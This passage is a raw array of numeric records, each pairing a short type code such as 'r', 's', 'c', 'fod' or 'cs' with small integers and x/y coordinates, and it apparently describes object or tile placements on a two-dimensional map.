"r", 170, 238, 0], [1, "r", 171, 239, 0], [1, "r", 170, 239, 0], [1, "r", 169, 239, 0], [1, "r", 168, 239, 0], [1, "r", 167, 239, 0], [1, "r", 166, 239, 0], [1, "r", 166, 240, 0], [1, "r", 167, 240, 0], [1, "r", 168, 240, 0], [1, "r", 169, 240, 0], [1, "r", 170, 240, 0], [1, "r", 168, 241, 0], [1, "r", 169, 241, 0], [1, "r", 170, 241, 0], [1, "r", 171, 241, 0], [1, "plm", 2, 171, 238, 0], [1, "plm", 1, 166, 238, 0], [1, "plm", 0, 167, 237, 0], [1, "plm", 0, 171, 242, 0], [1, "plm", 0, 165, 243, 0], [1, "plm", 0, 171, 235, 0], [1, "plm", 0, 174, 241, 0], [1, "s", 1, 165, 239, 1], [1, "s", 1, 172, 241, 1], [1, "s", 0, 170, 237, 1], [1, "s", 1, 171, 237, 1], [1, "s", 2, 174, 236, 1], [1, "s", 2, 162, 241, 1], [1, "s", 2, 170, 246, 1], [1, "s", 2, 167, 235, 1], [1, "s", 2, 176, 243, 1], [1, "r", 190, 207, 0], [1, "r", 191, 207, 0], [1, "r", 192, 208, 0], [1, "r", 191, 208, 0], [1, "r", 190, 208, 0], [1, "r", 189, 208, 0], [1, "r", 188, 208, 0], [1, "r", 189, 209, 0], [1, "r", 190, 209, 0], [1, "r", 191, 209, 0], [1, "r", 188, 209, 0], [1, "r", 190, 210, 0], [1, "r", 191, 210, 0], [1, "r", 192, 210, 0], [1, "plm", 2, 189, 210, 0], [1, "plm", 2, 192, 205, 0], [1, "plm", 1, 192, 207, 0], [1, "plm", 0, 193, 210, 0], [1, "plm", 0, 187, 208, 0], [1, "plm", 0, 197, 206, 0], [1, "plm", 0, 191, 213, 0], [1, "plm", 0, 190, 204, 0], [1, "s", 1, 188, 207, 1], [1, "s", 1, 190, 211, 1], [1, "s", 2, 188, 213, 1], [1, "s", 2, 187, 205, 1], [1, "s", 0, 194, 210, 1], [1, "s", 0, 198, 207, 1], [1, "s", 1, 193, 204, 1], [1, "s", 1, 193, 213, 1], [1, "s", 2, 198, 212, 1], [1, "s", 2, 182, 208, 1], [1, "s", 1, 204, 271, 1], [1, "s", 0, 203, 272, 1], [1, "s", 0, 189, 275, 1], [1, "s", 0, 195, 265, 1], [1, "s", 2, 196, 264, 1], [1, "s", 2, 186, 274, 1], [1, "s", 2, 197, 280, 1], [1, "s", 0, 217, 282, 1], [1, "s", 1, 214, 285, 1], [1, "s", 1, 214, 274, 1], [1, "s", 1, 203, 282, 1], [1, "s", 1, 205, 290, 1], [1, "s", 0, 207, 292, 1], [1, "s", 0, 197, 297, 1], [1, "s", 0, 184, 287, 1], [1, "s", 2, 213, 289, 1], [1, "s", 2, 196, 294, 1], [1, "s", 2, 187, 286, 1], [1, "s", 1, 192, 289, 1], [1, "s", 1, 189, 299, 1], [1, "s", 0, 213, 273, 1], [1, "g", 2, 212, 278, 1], [1, "g", 1, 200, 288, 1], [1, "g", 2, 215, 265, 1], [1, "g", 2, 183, 281, 1], [1, "s", 0, 178, 295, 1], [1, "s", 0, 167, 281, 1], [1, "s", 0, 175, 263, 1], [1, "s", 1, 176, 293, 1], [1, "s", 1, 163, 285, 1], [1, "s", 1, 177, 266, 1], [1, "s", 1, 161, 272, 1], [1, "s", 2, 185, 261, 1], [1, "c", 0, 217, 270, 1], [1, "c", 0, 220, 278, 1], [1, "c", 0, 217, 283, 1], [1, "c", 0, 220, 287, 1], [1, "c", 0, 210, 292, 1], [1, "c", 0, 205, 297, 1], [1, "c", 0, 198, 293, 1], [1, "c", 0, 208, 283, 1], [1, "c", 0, 197, 283, 1], [1, "c", 0, 190, 289, 1], [1, "c", 0, 183, 296, 1], [1, "c", 0, 189, 291, 1], [1, "c", 0, 178, 284, 1], [1, "c", 0, 208, 265, 1], [1, "c", 0, 169, 292, 1], [1, "s", 1, 158, 294, 1], [1, "s", 0, 151, 297, 1], [1, "s", 0, 147, 288, 1], [1, "c", 0, 150, 289, 1], [1, "c", 0, 160, 282, 1], [1, "c", 0, 146, 274, 1], [1, "c", 0, 167, 264, 1], [1, "c", 0, 165, 267, 1], [1, "g", 0, 189, 257, 1], [1, "g", 1, 197, 248, 1], [1, "g", 2, 170, 255, 1], [1, "g", 2, 212, 234, 1], [1, "g", 2, 189, 230, 1], [1, "g", 2, 173, 221, 1], [1, "g", 1, 210, 214, 1], [1, "s", 1, 153, 257, 1], [1, "s", 0, 158, 255, 1], [1, "s", 0, 184, 248, 1], [1, "s", 0, 212, 254, 1], [1, "s", 1, 203, 249, 1], [1, "s", 2, 204, 252, 1], [1, "s", 2, 187, 248, 1], [1, "s", 0, 206, 237, 1], [1, "s", 0, 196, 227, 1], [1, "s", 0, 181, 228, 1], [1, "s", 1, 199, 227, 1], [1, "s", 1, 208, 238, 1], [1, "s", 1, 179, 222, 1], [1, "s", 1, 213, 223, 1], [1, "s", 2, 182, 222, 1], [1, "s", 2, 211, 226, 1], [1, "s", 2, 214, 214, 1], [1, "s", 2, 201, 216, 1], [1, "s", 2, 215, 192, 1], [1, "s", 1, 210, 198, 1], [1, "s", 1, 198, 196, 1], [1, "s", 2, 208, 199, 1], [1, "s", 2, 187, 192, 1], [1, "s", 1, 179, 198, 1], [1, "s", 2, 177, 197, 1], [1, "s", 0, 164, 197, 1], [1, "s", 1, 159, 193, 1], [1, "s", 1, 149, 206, 1], [1, "s", 1, 164, 209, 1], [1, "s", 2, 165, 210, 1], [1, "s", 2, 161, 191, 1], [1, "s", 1, 162, 224, 1], [1, "s", 0, 150, 236, 1], [1, "s", 1, 149, 239, 1], [1, "s", 2, 153, 236, 1], [1, "s", 2, 160, 223, 1], [1, "s", 2, 151, 207, 1], [1, "s", 2, 147, 220, 1], [1, "s", 2, 145, 265, 1], [1, "s", 2, 145, 285, 1], [1, "c", 0, 152, 266, 1], [1, "c", 0, 185, 271, 1], [1, "c", 0, 210, 254, 1], [1, "c", 0, 209, 256, 1], [1, "c", 0, 198, 254, 1], [1, "c", 0, 213, 246, 1], [1, "c", 0, 216, 237, 1], [1, "c", 0, 204, 240, 1], [1, "c", 0, 196, 234, 1], [1, "c", 0, 188, 238, 1], [1, "c", 0, 182, 245, 1], [1, "c", 0, 173, 252, 1], [1, "c", 0, 153, 248, 1], [1, "c", 0, 158, 233, 1], [1, "c", 0, 147, 230, 1], [1, "c", 0, 151, 224, 1], [1, "c", 0, 157, 214, 1], [1, "c", 0, 167, 219, 1], [1, "c", 0, 171, 208, 1], [1, "c", 0, 179, 219, 1], [1, "c", 0, 176, 229, 1], [1, "c", 0, 195, 221, 1], [1, "c", 0, 207, 222, 1], [1, "c", 0, 214, 207, 1], [1, "c", 0, 205, 210, 1], [1, "c", 0, 204, 196, 1], [1, "c", 0, 214, 196, 1], [1, "c", 0, 190, 199, 1], [1, "c", 0, 184, 194, 1], [1, "c", 0, 172, 199, 1], [1, "c", 0, 161, 204, 1], [1, "c", 0, 157, 196, 1], [1, "c", 0, 149, 194, 1], [1, "c", 0, 147, 208, 1], [1, "c", 0, 207, 274, 1], [1, "c", 0, 217, 258, 1], [1, "c", 0, 201, 260, 1], [1, "c", 0, 178, 276, 1], [1, "c", 0, 187, 265, 1], [1, "s", 1, 204, 260, 1], [1, "s", 1, 216, 260, 1], [1, "s", 1, 187, 255, 1], [1, "s", 2, 189, 254, 1], [1, "s", 2, 212, 257, 1], [1, "s", 2, 182, 286, 1], [1, "s", 2, 169, 280, 1], [1, "s", 2, 217, 273, 1], [1, "s", 2, 215, 282, 1], [1, "s", 2, 172, 263, 1], [1, "s", 2, 176, 267, 1], [1, "s", 2, 215, 251, 1], [1, "fod", 1, 221, 282, 0], [1, "fod", 1, 222, 284, 0], [1, "fod", 1, 221, 290, 0], [1, "fod", 1, 222, 294, 0], [1, "fod", 1, 221, 297, 0], [1, "fod", 1, 223, 298, 0], [1, "fod", 1, 222, 300, 0], [1, "fod", 1, 218, 301, 0], [1, "fod", 1, 217, 299, 0], [1, "fod", 1, 215, 301, 0], [1, "fod", 1, 212, 300, 0], [1, "fod", 1, 206, 300, 0], [1, "fod", 1, 209, 301, 0], [1, "fod", 1, 204, 299, 0], [1, "fod", 1, 202, 301, 0], [1, "fod", 1, 199, 301, 0], [1, "fod", 1, 222, 282, 0], [1, "fod", 1, 207, 301, 0], [1, "fod", 1, 197, 301, 0], [1, "fod", 1, 215, 291, 0], [1, "fod", 1, 216, 286, 0], [1, "fod", 1, 214, 292, 0], [1, "fod", 1, 210, 289, 0], [1, "fod", 1, 208, 294, 0], [1, "fod", 1, 210, 298, 0], [1, "fod", 1, 212, 281, 0], [1, "fod", 1, 219, 278, 0], [1, "fod", 1, 219, 282, 0], [1, "fod", 1, 205, 286, 0], [1, "fod", 1, 202, 293, 0], [1, "fod", 1, 198, 295, 0], [1, "fod", 2, 213, 282, 0], [1, "fod", 2, 213, 291, 0], [1, "fod", 2, 216, 289, 0], [1, "fod", 2, 219, 289, 0], [1, "fod", 2, 218, 285, 0], [1, "fod", 2, 220, 283, 0], [1, "fod", 2, 211, 283, 0], [1, "fod", 2, 215, 281, 0], [1, "fod", 2, 217, 279, 0], [1, "fod", 2, 208, 290, 0], [1, "fod", 2, 211, 296, 0], [1, "fod", 2, 215, 294, 0], [1, "fod", 2, 212, 298, 0], [1, "fod", 2, 203, 294, 0], [1, "fod", 2, 204, 288, 0], [1, "fod", 2, 200, 294, 0], [1, "fod", 2, 198, 297, 0], [1, "fod", 2, 202, 299, 0], [1, "fod", 2, 200, 299, 0], [1, "fod", 2, 220, 300, 0], [1, "fod", 2, 220, 295, 0], [1, "fod", 2, 220, 292, 0], [1, "fod", 2, 219, 287, 0], [1, "fod", 2, 211, 288, 0], [1, "fod", 2, 213, 287, 0], [1, "fod", 2, 211, 289, 0], [1, "fod", 2, 212, 290, 0], [1, "fod", 2, 195, 296, 0], [1, "fod", 2, 196, 299, 0], [1, "fod", 2, 194, 300, 0], [1, "fod", 2, 195, 300, 0], [1, "fod", 2, 213, 279, 0], [1, "fod", 2, 211, 279, 0], [1, "fod", 0, 218, 290, 0], [1, "fod", 0, 212, 294, 0], [1, "fod", 1, 213, 295, 0], [1, "fod", 1, 217, 292, 0], [1, "fod", 1, 218, 288, 0], [1, "fod", 1, 210, 295, 0], [1, "fod", 1, 213, 292, 0], [1, "fod", 1, 212, 289, 0], [1, "fod", 1, 205, 295, 0], [1, "fod", 2, 206, 296, 0], [1, "fod", 2, 208, 296, 0], [1, "fod", 2, 221, 288, 0], [1, "fod", 2, 209, 299, 0], [1, "fod", 2, 211, 291, 0], [1, "fod", 1, 203, 275, 0], [1, "fod", 1, 204, 272, 0], [1, "fod", 2, 205, 273, 0], [1, "fod", 2, 204, 276, 0], [1, "fod", 2, 202, 276, 0], [1, "fod", 2, 199, 277, 0], [1, "fod", 2, 202, 273, 0], [1, "fod", 2, 199, 270, 0], [1, "fod", 2, 194, 274, 0], [1, "fod", 2, 194, 277, 0], [1, "fod", 1, 192, 274, 0], [1, "fod", 1, 194, 267, 0], [1, "fod", 2, 194, 265, 0], [1, "fod", 2, 190, 272, 0], [1, "fod", 2, 191, 275, 0], [1, "fod", 2, 195, 274, 0], [1, "fod", 2, 200, 271, 0], [1, "fod", 1, 168, 243, 0], [1, "fod", 1, 175, 240, 0], [1, "fod", 1, 169, 234, 0], [1, "fod", 1, 162, 235, 0], [1, "fod", 2, 169, 236, 0], [1, "fod", 2, 171, 234, 0], [1, "fod", 2, 165, 238, 0], [1, "fod", 2, 173, 241, 0], [1, "fod", 2, 174, 238, 0], [1, "fod", 2, 176, 240, 0], [1, "fod", 2, 169, 244, 0], [1, "fod", 2, 166, 243, 0], [1, "fod", 2, 162, 236, 0], [1, "fod", 2, 164, 235, 0], [1, "fod", 2, 162, 233, 0], [1, "fod", 2, 163, 236, 0], [1, "fod", 2, 174, 242, 0], [1, "fod", 2, 171, 243, 0], [1, "fod", 1, 194, 206, 0], [1, "fod", 1, 190, 214, 0], [1, "fod", 1, 186, 206, 0], [1, "fod", 1, 197, 207, 0], [1, "fod", 2, 196, 208, 0], [1, "fod", 2, 198, 206, 0], [1, "fod", 2, 198, 208, 0], [1, "fod", 2, 194, 204, 0], [1, "fod", 2, 187, 206, 0], [1, "fod", 2, 186, 204, 0], [1, "fod", 2, 189, 214, 0], [1, "fod", 2, 189, 213, 0], [1, "fod", 2, 193, 215, 0], [1, "fod", 2, 194, 214, 0], [1, "fod", 2, 187, 215, 0], [1, "fod", 2, 193, 209, 0], [1, "fod", 2, 189, 211, 0], [1, "fod", 2, 187, 209, 0], [1, "fod", 2, 187, 207, 0], [1, "fod", 2, 191, 205, 0], [1, "fod", 2, 189, 203, 0], [1, "cs", 2, 224, 176, 1], [1, "cs", 0, 224, 177, 1], [1, "cs", 3, 224, 178, 1], [1, "cs", 2, 224, 179, 1], [1, "cs", 1, 224, 180, 1], [1, "cs", 2, 224, 181, 1], [1, "cs", 0, 224, 182, 1], [1, "cs", 2, 224, 183, 1], [1, "cs", 0, 224, 184, 1], [1, "cs", 3, 224, 185, 1], [1, "cs", 2, 224, 186, 1], [1, "cs", 0, 224, 187, 1], [1, "cs", 2, 224, 188, 1], [1, "cs", 0, 224, 189, 1], [1, "cs", 1, 224, 190, 1], [1, "cs", 2, 224, 191, 1], [1, "cs", 0, 224, 192, 1], [1, "cs", 2, 224, 193, 1], [1, "cs", 2, 224, 194, 1], [1, "cs", 1, 224, 195, 1], [1, "cs", 2, 224, 196, 1], [1, "cs", 0, 224, 197, 1], [1, "cs", 3, 224, 198, 1], [1, "cs", 2, 224, 199, 1], [1, "cs", 1, 224, 200, 1], [1, "cs", 2, 224, 201, 1], [1, "cs", 3, 224, 202, 1], [1, "cs", 0, 224, 203, 1], [1, "cs", 1, 224, 204, 1], [1, "cs", 2, 224, 205, 1], [1, "cs", 0, 224, 206, 1], [1, "cs", 1, 224, 207, 1], [1, "cs", 3, 224, 208, 1], [1, "cs", 2, 224, 209, 1], [1, "cs", 2, 224, 210, 1], [1, "cs", 0, 223, 211, 1], [1, "cs", 1, 224, 211, 1], [1, "cs", 2, 224, 212, 1], [1, "cs", 2, 224, 213, 1], [1, "cs", 1, 224, 214, 1], [1, "cs", 3, 224, 215, 1], [1, "cs", 0, 224, 216, 1], [1, "cs", 1, 224, 217, 1], [1, "cs", 2, 224, 218, 1], [1, "cs", 3, 224, 219, 1], [1, "cs", 0, 223, 215, 1], [1, "cs", 2, 223, 214, 1], [1, "cs", 2, 223, 212, 1], [1, "cs", 2, 223, 216, 1], [1, "cs", 3, 223, 217, 1], [1, "cs", 0, 223, 218, 1], [1, "cs", 0, 224, 220, 1], [1, "cs", 0, 224, 222, 1], [1, "cs", 0, 223, 209, 1], [1, "cs", 0, 223, 205, 1], [1, "cs", 2, 224, 221, 1], [1, "cs", 2, 223, 219, 1], [1, "cs", 2, 223, 220, 1], [1, "cs", 2, 223, 213, 1], [1, "cs", 2, 223, 210, 1], [1, "cs", 1, 223, 178, 1], [1, "cs", 3, 223, 179, 1], [1, "cs", 3, 223, 181, 1], [1, "cs", 3, 223, 182, 1], [1, "cs", 1, 223, 185, 1], [1, "cs", 2, 223, 184, 1], [1, "cs", 2, 223, 186, 1], [1, "cs", 0, 223, 180, 1], [1, "cs", 0, 223, 183, 1], [1, "cs", 2, 223, 187, 1], [1, "cs", 1, 223, 188, 1], [1, "cs", 2, 223, 189, 1], [1, "cs", 2, 223, 190, 1], [1, "cs", 3, 223, 191, 1], [1, "cs", 1, 223, 192, 1], [1, "cs", 2, 223, 193, 1], [1, "cs", 2, 223, 194, 1], [1, "cs", 3, 223, 195, 1], [1, "cs", 1, 223, 196, 1], [1, "cs", 2, 223, 197, 1], [1, "cs", 2, 223, 199, 1], [1, "cs", 2, 223, 198, 1], [1, "cs", 0, 223, 200, 1], [1, "cs", 2, 223, 201, 1], [1, "cs", 0, 223, 202, 1], [1, "cs", 3, 223, 203, 1], [1, "cs", 3, 223, 204, 1], [1, "cs", 3, 223, 206, 1], [1, "cs", 3, 223, 207, 1], [1, "cs", 3, 223, 208, 1], [1, "cs", 2, 223, 221, 1], [1, "cs", 2, 223, 222, 1], [1, "cs", 0, 223, 224, 1], [1, "cs", 0, 224, 228, 1], [1, "cs", 0, 224, 230, 1], [1, "cs", 0, 223, 234, 1], [1, "cs", 2, 223, 223, 1], [1, "cs", 2, 224, 223, 1], [1, "cs", 2, 224, 224, 1], [1, "cs", 2, 224, 225, 1], [1, "cs", 1, 223, 226, 1], [1, "cs", 1, 224, 231, 1], [1, "cs", 1, 223, 232, 1], [1, "cs", 3, 223, 225, 1], [1, "cs", 3, 224, 226, 1], [1, "cs", 3, 223, 227, 1], [1, "cs", 3, 224, 227, 1], [1, "cs", 3, 223, 229, 1], [1, "cs", 3, 223, 228, 1], [1, "cs", 3, 224, 229, 1], [1, "cs", 3, 223, 230, 1], [1, "cs", 3, 223, 231, 1], [1, "cs", 3, 224, 232, 1], [1, "cs", 3, 224, 233, 1], [1, "cs", 3, 223, 233, 1], [1, "cs", 3, 224, 234, 1], [1, "cs", 3, 224, 235, 1], [1, "cs", 3, 223, 235, 1], [1, "cs", 1, 224, 236, 1], [1, "cs", 2, 223, 236, 1], [1, "cs", 2, 223, 237, 1], [1, "cs", 3, 224, 237, 1], [1, "cs", 3, 224, 238, 1], [1, "cs", 0, 224, 239, 1], [1, "cs", 1, 223, 241, 1], [1, "cs", 0, 224, 243, 1], [1, "cs", 0, 223, 245, 1], [1, "cs", 0, 224, 247, 1], [1, "cs", 2, 223, 240, 1], [1, "cs", 2, 223, 239, 1], [1, "cs", 2, 224, 240, 1], [1, "cs", 2, 224, 241, 1], [1, "cs", 2, 224, 242, 1], [1, "cs", 2, 223, 242, 1], [1, "cs", 2, 223, 243, 1], [1, "cs", 2, 223, 244, 1], [1, "cs", 2, 224, 244, 1], [1, "cs", 2, 224, 245, 1], [1, "cs", 2, 224, 246, 1], [1, "cs", 3, 223, 238, 1], [1, "cs", 3, 223, 246, 1], [1, "cs", 2, 223, 247, 1], [1, "cs", 1, 223, 249, 1], [1, "cs", 1, 224, 253, 1], [1, "cs", 1, 223, 256, 1], [1, "cs", 0, 223, 254, 1], [1, "cs", 0, 224, 250, 1], [1, "cs", 3, 223, 248, 1], [1, "cs", 3, 223, 250, 1], [1, "cs", 3, 223, 252, 1], [1, "cs", 3, 223, 255, 1], [1, "cs", 3, 223, 257, 1], [1, "cs", 2, 224, 248, 1], [1, "cs", 2, 224, 249, 1], [1, "cs", 2, 223, 251, 1], [1, "cs", 2, 224, 251, 1], [1, "cs", 2, 224, 252, 1], [1, "cs", 2, 223, 253, 1], [1, "cs", 2, 224, 254, 1], [1, "cs", 2, 224, 255, 1], [1, "cs", 2, 224, 256, 1], [1, "cs", 2, 224, 257, 1], [1, "cs", 0, 224, 258, 1], [1, "cs", 0, 223, 261, 1], [1, "cs", 0, 224, 263, 1], [1, "cs", 0, 224, 266, 1], [1, "cs", 0, 224, 272, 1], [1, "cs", 0, 223, 270, 1], [1, "cs", 0, 223, 275, 1], [1, "cs", 1, 223, 259, 1], [1, "cs", 1, 223, 264, 1], [1, "cs", 1, 223, 268, 1], [1, "cs", 1, 224, 274, 1], [1, "cs", 2, 223, 258, 1], [1, "cs", 2, 223, 260, 1], [1, "cs", 2, 223, 263, 1], [1, "cs", 2, 223, 265, 1], [1, "cs", 2, 223, 267, 1], [1, "cs", 2, 223, 271, 1], [1, "cs", 2, 223, 273, 1], [1, "cs", 3, 223, 262, 1], [1, "cs", 3, 223, 266, 1], [1, "cs", 3, 223, 269, 1], [1, "cs", 3, 223, 272, 1], [1, "cs", 3, 223, 274, 1], [1, "cs", 3, 224, 275, 1], [1, "cs", 3, 224, 273, 1], [1, "cs", 3, 224, 271, 1], [1, "cs", 3, 224, 270, 1], [1, "cs", 3, 224, 269, 1], [1, "cs", 3, 224, 268, 1], [1, "cs", 3, 224, 267, 1], [1, "cs", 3, 224, 265, 1], [1, "cs", 3, 224, 264, 1], [1, "cs", 3, 224, 262, 1], [1, "cs", 3, 224, 261, 1], [1, "cs", 3, 224, 260, 1], [1, "cs", 3, 224, 259, 1], [1, "cs", 2, 223, 276, 1], [1, "cs", 1, 224, 276, 1], [1, "cs", 1, 224, 280, 1], [1, "cs", 1, 223, 281, 1], [1, "cs", 1, 224, 286, 1], [1, "cs", 0, 223, 280, 1], [1, "cs", 0, 223, 284, 1], [1, "cs", 0, 224, 288, 1], [1, "cs", 0, 224, 279, 1], [1, "cs", 2, 223, 277, 1], [1, "cs", 2, 224, 277, 1], [1, "cs", 2, 224, 278, 1], [1, "cs", 2, 224, 281, 1], [1, "cs", 2, 224, 283, 1], [1, "cs", 2, 224, 282, 1], [1, "cs", 2, 224, 284, 1], [1, "cs", 2, 224, 285, 1], [1, "cs", 2, 224, 287, 1], [1, "cs", 2, 223, 287, 1], [1, "cs", 2, 223, 285, 1], [1, "cs", 2, 223, 283, 1], [1, "cs", 2, 223, 279, 1], [1, "cs", 3, 223, 278, 1], [1, "cs", 3, 223, 282, 1], [1, "cs", 3, 223, 286, 1], [1, "cs", 3, 223, 289, 1], [1, "cs", 3, 224, 289, 1], [1, "cs", 2, 223, 288, 1], [1, "cs", 2, 224, 290, 1], [1, "cs", 1, 223, 290, 1], [1, "cs", 0, 224, 292, 1], [1, "cs", 0, 223, 294, 1], [1, "cs", 0, 224, 297, 1], [1, "cs", 0, 223, 299, 1], [1, "cs", 2, 223, 291, 1], [1, "cs", 2, 224, 291, 1], [1, "cs", 2, 223, 292, 1], [1, "cs", 2, 223, 293, 1], [1, "cs", 2, 224, 293, 1], [1, "cs", 2, 224, 294, 1], [1, "cs", 1, 224, 295, 1], [1, "cs", 2, 223, 295, 1], [1, "cs", 2, 223, 296, 1], [1, "cs", 2, 224, 296, 1], [1, "cs", 2, 223, 297, 1], [1, "cs", 2, 223, 298, 1], [1, "cs", 2, 224, 298, 1], [1, "cs", 2, 224, 299, 1], [1, "cs", 2, 223, 300, 1], [1, "cs", 1, 224, 300, 1], [1, "cs", 0, 223, 301, 1], [1, "cs", 0, 224, 302, 1], [1, "cs", 0, 224, 304, 1], [1, "cs", 3, 224, 301, 1], [1, "cs", 3, 224, 303, 1], [1, "cs", 0, 221, 303, 1], [1, "cs", 0, 219, 304, 1], [1, "cs", 1, 222, 304, 1], [1, "cs", 1, 222, 302, 1], [1, "cs", 2, 223, 302, 1], [1, "cs", 2, 223, 303, 1], [1, "cs", 2, 222, 303, 1], [1, "cs", 2, 223, 304, 1], [1, "cs", 2, 221, 304, 1], [1, "cs", 2, 220, 304, 1], [1, "cs", 2, 220, 303, 1], [1, "cs", 2, 220, 302, 1], [1, "cs", 2, 221, 302, 1], [1, "cs", 2, 219, 303, 1], [1, "cs", 0, 217, 302, 1], [1, "cs", 0, 215, 304, 1], [1, "cs", 0, 214, 302, 1], [1, "cs", 1, 218, 302, 1], [1, "cs", 1, 217, 304, 1], [1, "cs", 1, 215, 302, 1], [1, "cs", 2, 219, 302, 1], [1, "cs", 2, 218, 303, 1], [1, "cs", 2, 218, 304, 1], [1, "cs", 2, 217, 303, 1], [1, "cs", 2, 216, 304, 1], [1, "cs", 2, 215, 303, 1], [1, "cs", 2, 216, 303, 1], [1, "cs", 2, 216, 302, 1], [1, "cs", 2, 214, 303, 1], [1, "cs", 2, 214, 304, 1], [1, "cs", 0, 212, 302, 1], [1, "cs", 0, 210, 303, 1], [1, "cs", 0, 212, 304, 1], [1, "cs", 0, 208, 304, 1], [1, "cs", 1, 210, 302, 1], [1, "cs", 1, 208, 303, 1], [1, "cs", 2, 213, 302, 1], [1, "cs", 2, 213, 303, 1], [1, "cs", 2, 213, 304, 1], [1, "cs", 2, 212, 303, 1], [1, "cs", 2, 211, 304, 1], [1, "cs", 2, 211, 303, 1], [1, "cs", 2, 211, 302, 1], [1, "cs", 2, 209, 302, 1], [1, "cs", 2, 209, 303, 1], [1, "cs", 2, 209, 304, 1], [1, "cs", 2, 210, 304, 1], [1, "cs", 2, 208, 302, 1], [1, "cs", 0, 206, 303, 1], [1, "cs", 0, 203, 304, 1], [1, "cs", 0, 200, 303, 1], [1, "cs", 0, 199, 304, 1], [1, "cs", 0, 195, 304, 1], [1, "cs", 0, 191, 303, 1], [1, "cs", 0, 193, 304, 1], [1, "cs", 0, 189, 304, 1], [1, "cs", 1, 204, 303, 1], [1, "cs", 0, 197, 302, 1], [1, "cs", 0, 202, 302, 1], [1, "cs", 0, 188, 302, 1], [1, "cs", 0, 194, 302, 1], [1, "cs", 1, 197, 303, 1], [1, "cs", 1, 201, 304, 1], [1, "cs", 1, 192, 302, 1], [1, "cs", 1, 189, 303, 1], [1, "cs", 1, 205, 302, 1], [1, "cs", 1, 188, 304, 1], [1, "cs", 2, 207, 302, 1], [1, "cs", 2, 207, 303, 1], [1, "cs", 2, 207, 304, 1], [1, "cs", 2, 206, 304, 1], [1, "cs", 2, 206, 302, 1], [1, "cs", 2, 205, 303, 1], [1, "cs", 2, 204, 304, 1], [1, "cs", 2, 205, 304, 1], [1, "cs", 2, 204, 302, 1], [1, "cs", 2, 203, 302, 1], [1, "cs", 2, 203, 303, 1], [1, "cs", 2, 202, 303, 1], [1, "cs", 2, 201, 303, 1], [1, "cs", 2, 201, 302, 1], [1, "cs", 2, 200, 302, 1], [1, "cs", 2, 199, 302, 1], [1, "cs", 2, 198, 303, 1], [1, "cs", 2, 198, 302, 1], [1, "cs", 2, 199, 303, 1], [1, "cs", 2, 200, 304, 1], [1, "cs", 2, 202, 304, 1], [1, "cs", 2, 197, 304, 1], [1, "cs", 2, 198, 304, 1], [1, "cs", 2, 196, 304, 1], [1, "cs", 2, 196, 303, 1], [1, "cs", 2, 196, 302, 1], [1, "cs", 2, 195, 302, 1], [1, "cs", 2, 195, 303, 1], [1, "cs", 2, 194, 303, 1], [1, "cs", 2, 194, 304, 1], [1, "cs", 2, 193, 303, 1], [1, "cs", 2, 193, 302, 1], [1, "cs", 2, 192, 303, 1], [1, "cs", 2, 192, 304, 1], [1, "cs", 2, 191, 304, 1], [1, "cs", 2, 190, 304, 1], [1, "cs", 2, 190, 303, 1], [1, "cs", 2, 189, 302, 1], [1, "cs", 2, 190, 302, 1], [1, "cs", 2, 191, 302, 1], [1, "cs", 2, 188, 303, 1], [1, "cs", 0, 186, 303, 1], [1, "cs", 0, 183, 304, 1], [1, "cs", 0, 184, 302, 1], [1, "cs", 0, 181, 302, 1], [1, "cs", 0, 176, 302, 1], [1, "cs", 0, 178, 303, 1], [1, "cs", 0, 173, 304, 1], [1, "cs", 0, 170, 303, 1], [1, "cs", 0, 172, 302, 1], [1, "cs", 1, 182, 303, 1], [1, "cs", 1, 178, 304, 1], [1, "cs", 1, 175, 304, 1], [1, "cs", 1, 173, 302, 1], [1, "cs", 1, 185, 304, 1], [1, "cs", 1, 169, 304, 1], [1, "cs", 3, 187, 304, 1], [1, "cs", 3, 186, 304, 1], [1, "cs", 3, 187, 303, 1], [1, "cs", 3, 187, 302, 1], [1, "cs", 3, 186, 302, 1], [1, "cs", 3, 185, 302, 1], [1, "cs", 3, 185, 303, 1], [1, "cs", 3, 184, 303, 1], [1, "cs", 3, 183, 303, 1], [1, "cs", 3, 183, 302, 1], [1, "cs", 3, 182, 302, 1], [1, "cs", 3, 184, 304, 1], [1, "cs", 3, 182, 304, 1], [1, "cs", 3, 181, 304, 1], [1, "cs", 3, 179, 304, 1], [1, "cs", 3, 180, 304, 1], [1, "cs", 3, 181, 303, 1], [1, "cs", 3, 180, 303, 1], [1, "cs", 3, 179, 303, 1], [1, "cs", 3, 180, 302, 1], [1, "cs", 3, 179, 302, 1], [1, "cs", 3, 178, 302, 1], [1, "cs", 3, 177, 302, 1], [1, "cs", 3, 177, 304, 1], [1, "cs", 3, 177, 303, 1], [1, "cs", 3, 176, 303, 1], [1, "cs", 3, 176, 304, 1], [1, "cs", 3, 174, 304, 1], [1, "cs", 3, 175, 303, 1], [1, "cs", 3, 174, 303, 1], [1, "cs", 3, 173, 303, 1], [1, "cs", 3, 172, 303, 1], [1, "cs", 3, 171, 303, 1], [1, "cs", 3, 170, 304, 1], [1, "cs", 3, 171, 304, 1], [1, "cs", 3, 172, 304, 1], [1, "cs", 3, 174, 302, 1], [1, "cs", 3, 175, 302, 1], [1, "cs", 3, 171, 302, 1], [1, "cs", 3, 170, 302, 1], [1, "cs", 3, 169, 302, 1], [1, "cs", 3, 169, 303, 1], [1, "cs", 0, 168, 302, 1], [1, "cs", 0, 166, 303, 1], [1, "cs", 0, 163, 304, 1], [1, "cs", 0, 161, 302, 1], [1, "cs", 0, 159, 303, 1], [1, "cs", 0, 152, 304, 1], [1, "cs", 0, 155, 303, 1], [1, "cs", 1, 164, 303, 1], [1, "cs", 1, 162, 303, 1], [1, "cs", 1, 158, 304, 1], [1, "cs", 1, 156, 302, 1], [1, "cs", 1, 153, 302, 1], [1, "cs", 1, 154, 304, 1], [1, "cs", 2, 168, 304, 1], [1, "cs", 2, 168, 303, 1], [1, "cs", 2, 167, 303, 1], [1, "cs", 2, 167, 304, 1], [1, "cs", 2, 166, 304, 1], [1, "cs", 2, 165, 304, 1], [1, "cs", 2, 164, 304, 1], [1, "cs", 2, 165, 303, 1], [1, "cs", 2, 167, 302, 1], [1, "cs", 2, 166, 302, 1], [1, "cs", 2, 165, 302, 1], [1, "cs", 2, 164, 302, 1], [1, "cs", 2, 163, 302, 1], [1, "cs", 2, 162, 302, 1], [1, "cs", 2, 163, 303, 1], [1, "cs", 2, 162, 304, 1], [1, "cs", 2, 160, 304, 1], [1, "cs", 2, 159, 304, 1], [1, "cs", 2, 161, 304, 1], [1, "cs", 2, 161, 303, 1], [1, "cs", 2, 160, 303, 1], [1, "cs", 2, 160, 302, 1], 